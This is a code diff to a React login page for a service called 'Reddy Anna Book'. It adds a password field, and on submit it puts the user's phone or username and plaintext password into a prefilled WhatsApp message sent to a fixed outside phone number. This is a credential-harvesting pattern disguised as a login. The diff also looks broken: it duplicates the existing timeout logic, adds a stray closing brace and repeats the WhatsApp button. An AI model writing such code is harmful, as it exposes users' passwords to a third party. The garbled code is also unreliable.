@@ -45,6 +45,18 @@ export default function LoginPage() {
  setSuccess(false);
  }, 1200);
  };
+    // Success action
+    setSuccess(true);
+    
+    // Redirect to WhatsApp with prefilled message
+    setTimeout(() => {
+      const message = encodeURIComponent(
+        `Hello Reddy Anna Book, I want to login to my account.\nPhone/Username: ${phone}\nPassword: ${password}`
+      );
+      window.open(`https://wa.me/918360750829?text=${message}`, "_blank");
+      setSuccess(false);
+    }, 1200);
+  };
 
  return (
  <>
@@ -131,6 +143,41 @@ export default function LoginPage() {
  </button>
  </div>
  </div>
+            {/* Password Input */}
+            <div className="flex flex-col gap-1.5">
+              <div className="flex justify-between items-center">
+                <label htmlFor="password" className="text-gray-300 text-[13px] font-bold uppercase tracking-wider">
+                  Password
+                </label>
+                <a
+                  href="https://wa.me/918360750829?text=Hello,%20I%20forgot%20my%20Reddy%20Anna%20Login%20Password.%20Please%20help%20me%20reset%20it."
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-ra-gold hover:underline text-[12px] font-bold tracking-wide"
+                >
+                  Forgot Password?
+                </a>
+              </div>
+              <div className="relative">
+                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-[16px]">🔒</span>
+                <input
+                  id="password"
+                  type={showPassword ? "text" : "password"}
+                  placeholder="Enter Password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="w-full bg-black/40 border border-white/10 focus:border-ra-gold rounded-lg py-3 pl-11 pr-12 text-white text-[14px] placeholder-gray-500 outline-none transition-all"
+                  required
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white text-[14px] focus:outline-none"
+                >
+                  {showPassword ? "🙈" : "👁️"}
+                </button>
+              </div>
+            </div>
 
  {/* Error Message */}
  {error && (
@@ -170,6 +217,15 @@ export default function LoginPage() {
  <span>💬</span> Login with WhatsApp
  </a>
  </div>
+              <a
+                href="https://wa.me/918360750829?text=Hello%20Reddy%20Anna%20Book,%20I%20want%20to%20login%20to%20my%20account%20instantly."
+                target="_blank"
+                rel="noopener noreferrer"
+                className="w-full py-3 bg-[#25D366] hover:bg-[#20ba5a] text-white font-extrabold rounded-lg shadow-md transition-all uppercase tracking-widest text-[13px] flex items-center justify-center gap-2"
+              >
+                <span>💬</span> Login with WhatsApp
+              </a>
+            </div>
 
  </form>
 
